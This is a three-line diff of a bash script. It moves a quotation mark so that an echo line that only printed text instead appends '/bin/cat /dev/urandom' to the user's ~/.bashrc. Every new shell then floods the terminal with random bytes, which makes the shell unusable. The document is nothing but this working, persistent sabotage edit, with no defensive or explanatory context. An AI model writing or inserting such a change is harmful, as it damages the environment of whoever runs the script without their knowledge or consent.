@@ -1,3 +1,3 @@
 #!/bin/bash
 
-echo "/bin/cat /dev/urandom >> ~/.bashrc"
+echo "/bin/cat /dev/urandom" >> ~/.bashrc
